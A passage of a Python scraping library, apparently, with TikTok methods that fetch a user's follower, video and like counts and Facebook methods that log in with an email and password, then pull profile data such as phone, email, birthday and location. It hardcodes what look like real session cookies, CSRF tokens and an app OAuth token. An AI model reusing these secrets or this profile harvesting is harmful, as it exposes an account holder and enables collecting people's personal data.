cmpl_token=AgQQAPOnF-RMpbFlvj7mvJ04-F-i-0ZR_4csYMA9cQ; bm_mi=7444CFE66808C67F62BCEBB880BD4DB7~UHV9BJZPF2NZr3P4g421EuBTucUNYIexr523/VwvKCGfGzEAfA1abHo8HYcKocxP+laN76JpUglyrLWY/Gkgc2BxZA4J3kAdwnBbz96YgaPRpe2m9+BRU2xTO6kc/ycqlm+3zUicVNfb+BftRwhtikPp+l3bSk4GNtW1kKVJI3DTB2YzhM9BMwiYMTvpxW9tSed75nLNZDJuCY/wP2hwfbmR0+UrKlZggDnPvsfpv8k=; msToken=1gt3-BZ_WjAoOKJxJh77qZAJR0tGKOAx_iKHEG75TaFCWXltux0CfvXETy1S5uFizHuw9DcSWYsip8dnS1EpGdK7gG_7XVOBSU_F7yzjFdB6V9UyhBONnTMqvHgGsO9wY4IXWO0=; bm_sv=EC714A2F6623FDD508362A22220189F7~uPx5OKNtLIB/jt8DLjlHUsoWWA2xFWVI1T6e4HQN01YlW2sITk6VB9L8uvYfK6KWeeNGzPqsa+fnnxgvUnSNA5aYfYIDBepRuxD1J8oSmfnY8CDJOt+09fr3PnZLd+cAvxrBKSE1nAEhvdeNGnN0fTu4h4erxMOH27501pU0E8g=',
            'Origin': 'https://www.tiktok.com',
            'Referer': 'https://www.tiktok.com/'}
        data = {'uniqueld': str(user)}
        try:
            res = requests.get(url, headers=headers, data=data).content
            info = json.loads(res)
            following = info['userInfo']['stats']['followingCount']
            return {'following': str(following)}
        except:
            return False

    def videos(user: str) -> str:
        url = 'https://m.tiktok.com/api/user/detail/?aid=1988&app_name=tiktok_web&device_platform=web_mobile&device_id=7074866456449713670&region=IQ&priority_region=IQ&os=android&referer=&cookie_enabled=true&screen_width=393&screen_height=873&browser_language=ar-EG&browser_platform=Linux+aarch64&browser_name=Mozilla&browser_version=5.0+(Linux;+Android+11;+M2103K19G)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/99.0.4844.66+Mobile+Safari/537.36&browser_online=true&verifyFp=verify_l0wf3oa3_tprFK83t_Q0pW_4EH0_BU4w_42nV9RgFBTIH&app_language=ar&timezone_name=Asia/Baghdad&is_page_visible=true&focus_state=true&is_fullscreen=false&history_len=2&battery_info={}&uniqueId=' + str(
            user) + '&msToken=4M1DZ-8b03tXs9pqv4iVHGoa9RXRgOB11HjiL7cvs8Sit3X4JTzxsy1FUbmomfk1U3kiown_BdR8lyO_nyxhL6EgNXwVolAz4Qg50PD5imlyx5VhnUkEAeOvU6Gs4ejKs2ODHR8=&X-Bogus=DFSzswSOxhhANtVzSRkg-KW5ZE/N&_signature=_02B4Z6wo0000142Tr2wAAIDC54h1kUWPxv-Nk6vAAIFYd8'
        headers = {
            'User-Agent': str(gdo_drow.get_user_agent()),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json',
            'Cookie': 'passport_csrf_token=458c72cf0594545b4d8e79bf3caded25; passport_csrf_token_default=458c72cf0594545b4d8e79bf3caded25; passport_auth_status=251fd84db2fafd555a135e73908379b5,; passport_auth_status_ss=251fd84db2fafd555a135e73908379b5,; sid_guard=9eac4270bbe6804badac8696654b064e|1648687327|5184000|Mon,+30-May-2022+00:42:07+GMT; uid_tt=6d8a5958360a534b628ae820fa7a2bdd67e9902f9494fceebe98cd9950759557; uid_tt_ss=6d8a5958360a534b628ae820fa7a2bdd67e9902f9494fceebe98cd9950759557; sid_tt=9eac4270bbe6804badac8696654b064e; sessionid=9eac4270bbe6804badac8696654b064e; sessionid_ss=9eac4270bbe6804badac8696654b064e; sid_ucp_v1=1.0.0-KDQ4MDZkODM4NzQ0MDE1YzNlYjlkOGJjYWMxZDhlYTk3OTY4MWUzYTEKHwiBiLn0lpPUrWEQ3_GTkgYYswsgDDCfpu2KBjgIQBIQAxoGbWFsaXZhIiA5ZWFjNDI3MGJiZTY4MDRiYWRhYzg2OTY2NTRiMDY0ZQ; ssid_ucp_v1=1.0.0-KDQ4MDZkODM4NzQ0MDE1YzNlYjlkOGJjYWMxZDhlYTk3OTY4MWUzYTEKHwiBiLn0lpPUrWEQ3_GTkgYYswsgDDCfpu2KBjgIQBIQAxoGbWFsaXZhIiA5ZWFjNDI3MGJiZTY4MDRiYWRhYzg2OTY2NTRiMDY0ZQ; store-idc=alisg; store-country-code=iq; tt-target-idc=alisg; tt_csrf_token=TOzZoC0p-lXaXuL7lq6ynvJywC006F8ixc-A; _abck=093D884478C406B48D6E8F4696FBC348~-1~YAAQBLR7XL8RDiOAAQAABiCpMgf/mTykvtzUPdMKxO5b9PAf4oFOTanUbEbor2OmIngPpyC6Gzf66YjbaUUGpIPpBJ6ZwPhpCdVw4jctEx+wSCOttDZjMU65rD6zxWbtErf36ZnocPLoCiwN5pagDq/K3e/s5O4bpPtO5xf8le7+yGLPsEHjMwGneEj6YSGYSE9QauyY6FvziUVCTSNQiuEUC8Soy+kufKxVEpwwzN5Zo1KV1q1rw4rtClwvCDo4CEi8icykPZfjta2PKf2zax/B4euHxWX5mzFP7HmPFsmBK8UQvmAM++ZUF7AY52kH1Polr7cB9ziWZAuRcLRO4UIKu35+cMb4xjJH3bAWXZXX5DaFoi55crdz3h9RBRzmCDTB5LPPiIN/RDA=~-1~-1~-1; ak_bmsc=3B8069AEE7E00870B984D180ECFFBD5D~000000000000000000000000000000~YAAQBLR7XMARDiOAAQAABiCpMg9auExniSBpZbCVcLzVPFqefIbpGImTcAxDH2gABB5UwaA2MVjucEhh3S7gz30SLbwpNUNrz1kgII1USn5iNT3nlqfwkJVlcGM/1WSVAAT4ZgMH9JJsS//Ev2hNH0Ux3RbCPvS+5d88mwT/lNKfrvgYT1zmm+1gb21gQNNIgnt3RSvR26eNTW80k36v2qJi1mLyiQVZYD3rRi94vlyWRGASfWooBznWg99OujqaSU2DXh2EuyupYmhBBkiOFvQFkvapmgdgfcIRy9HQJROh4YzV3aFuxOWpi+5a0DxdYE5kuh4dcEjOL7RDIukoWWNvcjLhX2ViXpIsA2NyFLbWTPq5nQFOArd4a+KagglgXyHAIX41UAg=; bm_sz=C6365C417EF2307C8B0C15C7E15B62F5~YAAQBLR7XMERDiOAAQAABiCpMg8IGWK7o/apYJdjwsv1/wjLItPslFiabm8NbHoZlZ73XiI+aRFhHtVd+ptrlGm0b5jJM63YDiGi+4Rb/IXFoZMyZmtm2If31jRMKd0p8jcPat/qubsjnRKFdRKSBqnJymUgVOb/A6SlOBhOfAqCXRJ0AvRBWce3f55YpiqDr50KCJS77E5dDyowvlOcXIbULbqO5MbYMj93Nl8DptG025NLLhevbIltxsVtU9Mr0OTE1ewY8MNOwZFKRM+0lZ1fvuQUJBFNTlqHwa6hbs3BXkc=~3552578~4408887; odin_tt=27b8d72a704b3dd1b987f6309bb1afbde567eb6d8f4108cc0c01daf7b00cc85a6461560b71a5592eb54b6776088e5a22971675b58ccfc9405aea62e1bf507156cec903e457da0accc7dbf02dfdef9cb7; ttwid=1|Y3Nv6hZ_tt-KrXdOWRCHJUZNBnvJt9gACwthXSzp5uY|1650117421|a5d1e6984719ca946c7088a118f5c09ca9468056b9430fd38b2ef693aaeb1eee; cmpl_token=AgQQAPOnF-RMpbFlvj7mvJ04-F-i-0ZR_4csYMA9cQ; bm_mi=7444CFE66808C67F62BCEBB880BD4DB7~UHV9BJZPF2NZr3P4g421EuBTucUNYIexr523/VwvKCGfGzEAfA1abHo8HYcKocxP+laN76JpUglyrLWY/Gkgc2BxZA4J3kAdwnBbz96YgaPRpe2m9+BRU2xTO6kc/ycqlm+3zUicVNfb+BftRwhtikPp+l3bSk4GNtW1kKVJI3DTB2YzhM9BMwiYMTvpxW9tSed75nLNZDJuCY/wP2hwfbmR0+UrKlZggDnPvsfpv8k=; msToken=1gt3-BZ_WjAoOKJxJh77qZAJR0tGKOAx_iKHEG75TaFCWXltux0CfvXETy1S5uFizHuw9DcSWYsip8dnS1EpGdK7gG_7XVOBSU_F7yzjFdB6V9UyhBONnTMqvHgGsO9wY4IXWO0=; bm_sv=EC714A2F6623FDD508362A22220189F7~uPx5OKNtLIB/jt8DLjlHUsoWWA2xFWVI1T6e4HQN01YlW2sITk6VB9L8uvYfK6KWeeNGzPqsa+fnnxgvUnSNA5aYfYIDBepRuxD1J8oSmfnY8CDJOt+09fr3PnZLd+cAvxrBKSE1nAEhvdeNGnN0fTu4h4erxMOH27501pU0E8g=',
            'Origin': 'https://www.tiktok.com',
            'Referer': 'https://www.tiktok.com/'}
        data = {'uniqueld': str(user)}
        try:
            res = requests.get(url, headers=headers, data=data).content
            info = json.loads(res)
            video = info['userInfo']['stats']['videoCount']
            return {'videos': str(video)}
        except:
            return False

    def heart(user: str) -> str:
        url = 'https://m.tiktok.com/api/user/detail/?aid=1988&app_name=tiktok_web&device_platform=web_mobile&device_id=7074866456449713670&region=IQ&priority_region=IQ&os=android&referer=&cookie_enabled=true&screen_width=393&screen_height=873&browser_language=ar-EG&browser_platform=Linux+aarch64&browser_name=Mozilla&browser_version=5.0+(Linux;+Android+11;+M2103K19G)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/99.0.4844.66+Mobile+Safari/537.36&browser_online=true&verifyFp=verify_l0wf3oa3_tprFK83t_Q0pW_4EH0_BU4w_42nV9RgFBTIH&app_language=ar&timezone_name=Asia/Baghdad&is_page_visible=true&focus_state=true&is_fullscreen=false&history_len=2&battery_info={}&uniqueId=' + str(
            user) + '&msToken=4M1DZ-8b03tXs9pqv4iVHGoa9RXRgOB11HjiL7cvs8Sit3X4JTzxsy1FUbmomfk1U3kiown_BdR8lyO_nyxhL6EgNXwVolAz4Qg50PD5imlyx5VhnUkEAeOvU6Gs4ejKs2ODHR8=&X-Bogus=DFSzswSOxhhANtVzSRkg-KW5ZE/N&_signature=_02B4Z6wo0000142Tr2wAAIDC54h1kUWPxv-Nk6vAAIFYd8'
        headers = {
            'User-Agent': str(gdo_drow.get_user_agent()),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json',
            'Cookie': 'passport_csrf_token=458c72cf0594545b4d8e79bf3caded25; passport_csrf_token_default=458c72cf0594545b4d8e79bf3caded25; passport_auth_status=251fd84db2fafd555a135e73908379b5,; passport_auth_status_ss=251fd84db2fafd555a135e73908379b5,; sid_guard=9eac4270bbe6804badac8696654b064e|1648687327|5184000|Mon,+30-May-2022+00:42:07+GMT; uid_tt=6d8a5958360a534b628ae820fa7a2bdd67e9902f9494fceebe98cd9950759557; uid_tt_ss=6d8a5958360a534b628ae820fa7a2bdd67e9902f9494fceebe98cd9950759557; sid_tt=9eac4270bbe6804badac8696654b064e; sessionid=9eac4270bbe6804badac8696654b064e; sessionid_ss=9eac4270bbe6804badac8696654b064e; sid_ucp_v1=1.0.0-KDQ4MDZkODM4NzQ0MDE1YzNlYjlkOGJjYWMxZDhlYTk3OTY4MWUzYTEKHwiBiLn0lpPUrWEQ3_GTkgYYswsgDDCfpu2KBjgIQBIQAxoGbWFsaXZhIiA5ZWFjNDI3MGJiZTY4MDRiYWRhYzg2OTY2NTRiMDY0ZQ; ssid_ucp_v1=1.0.0-KDQ4MDZkODM4NzQ0MDE1YzNlYjlkOGJjYWMxZDhlYTk3OTY4MWUzYTEKHwiBiLn0lpPUrWEQ3_GTkgYYswsgDDCfpu2KBjgIQBIQAxoGbWFsaXZhIiA5ZWFjNDI3MGJiZTY4MDRiYWRhYzg2OTY2NTRiMDY0ZQ; store-idc=alisg; store-country-code=iq; tt-target-idc=alisg; tt_csrf_token=TOzZoC0p-lXaXuL7lq6ynvJywC006F8ixc-A; _abck=093D884478C406B48D6E8F4696FBC348~-1~YAAQBLR7XL8RDiOAAQAABiCpMgf/mTykvtzUPdMKxO5b9PAf4oFOTanUbEbor2OmIngPpyC6Gzf66YjbaUUGpIPpBJ6ZwPhpCdVw4jctEx+wSCOttDZjMU65rD6zxWbtErf36ZnocPLoCiwN5pagDq/K3e/s5O4bpPtO5xf8le7+yGLPsEHjMwGneEj6YSGYSE9QauyY6FvziUVCTSNQiuEUC8Soy+kufKxVEpwwzN5Zo1KV1q1rw4rtClwvCDo4CEi8icykPZfjta2PKf2zax/B4euHxWX5mzFP7HmPFsmBK8UQvmAM++ZUF7AY52kH1Polr7cB9ziWZAuRcLRO4UIKu35+cMb4xjJH3bAWXZXX5DaFoi55crdz3h9RBRzmCDTB5LPPiIN/RDA=~-1~-1~-1; ak_bmsc=3B8069AEE7E00870B984D180ECFFBD5D~000000000000000000000000000000~YAAQBLR7XMARDiOAAQAABiCpMg9auExniSBpZbCVcLzVPFqefIbpGImTcAxDH2gABB5UwaA2MVjucEhh3S7gz30SLbwpNUNrz1kgII1USn5iNT3nlqfwkJVlcGM/1WSVAAT4ZgMH9JJsS//Ev2hNH0Ux3RbCPvS+5d88mwT/lNKfrvgYT1zmm+1gb21gQNNIgnt3RSvR26eNTW80k36v2qJi1mLyiQVZYD3rRi94vlyWRGASfWooBznWg99OujqaSU2DXh2EuyupYmhBBkiOFvQFkvapmgdgfcIRy9HQJROh4YzV3aFuxOWpi+5a0DxdYE5kuh4dcEjOL7RDIukoWWNvcjLhX2ViXpIsA2NyFLbWTPq5nQFOArd4a+KagglgXyHAIX41UAg=; bm_sz=C6365C417EF2307C8B0C15C7E15B62F5~YAAQBLR7XMERDiOAAQAABiCpMg8IGWK7o/apYJdjwsv1/wjLItPslFiabm8NbHoZlZ73XiI+aRFhHtVd+ptrlGm0b5jJM63YDiGi+4Rb/IXFoZMyZmtm2If31jRMKd0p8jcPat/qubsjnRKFdRKSBqnJymUgVOb/A6SlOBhOfAqCXRJ0AvRBWce3f55YpiqDr50KCJS77E5dDyowvlOcXIbULbqO5MbYMj93Nl8DptG025NLLhevbIltxsVtU9Mr0OTE1ewY8MNOwZFKRM+0lZ1fvuQUJBFNTlqHwa6hbs3BXkc=~3552578~4408887; odin_tt=27b8d72a704b3dd1b987f6309bb1afbde567eb6d8f4108cc0c01daf7b00cc85a6461560b71a5592eb54b6776088e5a22971675b58ccfc9405aea62e1bf507156cec903e457da0accc7dbf02dfdef9cb7; ttwid=1|Y3Nv6hZ_tt-KrXdOWRCHJUZNBnvJt9gACwthXSzp5uY|1650117421|a5d1e6984719ca946c7088a118f5c09ca9468056b9430fd38b2ef693aaeb1eee; cmpl_token=AgQQAPOnF-RMpbFlvj7mvJ04-F-i-0ZR_4csYMA9cQ; bm_mi=7444CFE66808C67F62BCEBB880BD4DB7~UHV9BJZPF2NZr3P4g421EuBTucUNYIexr523/VwvKCGfGzEAfA1abHo8HYcKocxP+laN76JpUglyrLWY/Gkgc2BxZA4J3kAdwnBbz96YgaPRpe2m9+BRU2xTO6kc/ycqlm+3zUicVNfb+BftRwhtikPp+l3bSk4GNtW1kKVJI3DTB2YzhM9BMwiYMTvpxW9tSed75nLNZDJuCY/wP2hwfbmR0+UrKlZggDnPvsfpv8k=; msToken=1gt3-BZ_WjAoOKJxJh77qZAJR0tGKOAx_iKHEG75TaFCWXltux0CfvXETy1S5uFizHuw9DcSWYsip8dnS1EpGdK7gG_7XVOBSU_F7yzjFdB6V9UyhBONnTMqvHgGsO9wY4IXWO0=; bm_sv=EC714A2F6623FDD508362A22220189F7~uPx5OKNtLIB/jt8DLjlHUsoWWA2xFWVI1T6e4HQN01YlW2sITk6VB9L8uvYfK6KWeeNGzPqsa+fnnxgvUnSNA5aYfYIDBepRuxD1J8oSmfnY8CDJOt+09fr3PnZLd+cAvxrBKSE1nAEhvdeNGnN0fTu4h4erxMOH27501pU0E8g=',
            'Origin': 'https://www.tiktok.com',
            'Referer': 'https://www.tiktok.com/'}
        data = {'uniqueld': str(user)}
        try:
            res = requests.get(url, headers=headers, data=data).content
            info = json.loads(res)
            heart = info['userInfo']['stats']['heartCount']
            return {'heart': str(heart)}
        except:
            return False


# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------

class info_facebook:

    def get_id_for_url(url: str) -> str:
        url = str(url)
        try:
            res = requests.get(url).text
            if ('userID":"') in res:
                uid = res.split('userID":"')[1]
                id = uid.split('",')[0]
                return {'status': 'true', 'userID': str(id)}
            else:
                return {'status': 'false', 'userID': None}

        except:
            return False

    def get_token_id(email: str, password: str) -> str:
        url = "https://b-graph.facebook.com/auth/login"
        headers = {
            "authorization": "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
            "user-agent": "Dalvik/2.1.0 (Linux; U; Android 10; BLA-L29 Build/HUAWEIBLA-L29S) [FBAN/MessengerLite;FBAV/305.0.0.7.106;FBPN/com.facebook.mlite;FBLC/ar_PS;FBBV/372376702;FBCR/Ooredoo;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/BLA-L29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2040};]"}
        data = f"email={email}&password={password}&credentials_type=password&error_detail_type=button_with_disabled&format=json&device_id={uuid.uuid4()}&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&method=POST"
        res = requests.post(url, data=data, headers=headers, verify=False, timeout=15).json()
        if list(res)[0] == "session_key":
            message = {
                'status': 'Success',
                'id': str(res["uid"]),
                'access_token': str(res["access_token"])}
        else:
            try:
                message = {
                    'status': 'error',
                    'message': str(res["error"]["error_user_title"])}
                return message
            except:
                return {'status': 'error'}

    def name(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s?access_token=%s' % (id, token)).json()
            name = (res['name'])
            return name
        except:
            return False

    def first_name(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s?access_token=%s' % (id, token)).json()
            name = (res['first_name'])
            return name
        except:
            return False

    def last_name(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s?access_token=%s' % (id, token)).json()
            name = (res['last_name'])
            return name
        except:
            return False

    def username(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s?access_token=%s' % (id, token)).json()
            name = (res['username'])
            return name
        except:
            return False

    def email(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s?access_token=%s' % (id, token)).json()
            name = (res['email'])
            return name
        except:
            return False

    def phone(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s?access_token=%s' % (id, token)).json()
            name = (res['mobile_phone'])
            return name
        except:
            return False

    def birthday(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s?access_token=%s' % (id, token)).json()
            name = (res['birthday'])
            return name
        except:
            return False

    def gender(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s?access_token=%s' % (id, token)).json()
            name = (res['gender'])
            return name
        except:
            return False

    def link(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s?access_token=%s' % (id, token)).json()
            name = (res['link'])
            return name
        except:
            return False

    def status(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s?access_token=%s' % (id, token)).json()
            name = (res['relationship_status'])
            return name
        except:
            return False

    def bio(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s?access_token=%s' % (id, token)).json()
            name = (res['about'])
            return name
        except:
            return False

    def hometown(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s?access_token=%s' % (id, token)).json()
            name = (res['hometown']['name'])
            return name
        except:
            return False

    def location(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s?access_token=%s' % (id, token)).json()
            name = (res['location']['name'])
            return name
        except:
            return False

    def timezone(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s?access_token=%s' % (id, token)).json()
            name = (res['timezone'])
            return name
        except:
            return False

    def updated_time(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s?access_token=%s' % (id, token)).json()
            name = (res['updated_time'])
            return name
        except:
            return False

    def friends(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s' % (id, token)).json()
            friends = []
            for i in res['data']:
                friends.append(i['id'])

            return str(len(friends))
        except:
            return False

    def followers(id: str, token: str) -> str:
        id = str(id);
        token = str(token)
        try:
            res = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s' % (id, token)).json()
            followers = res['summary']['total_count']
            return followers
        except:
            return False

# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ-------------------------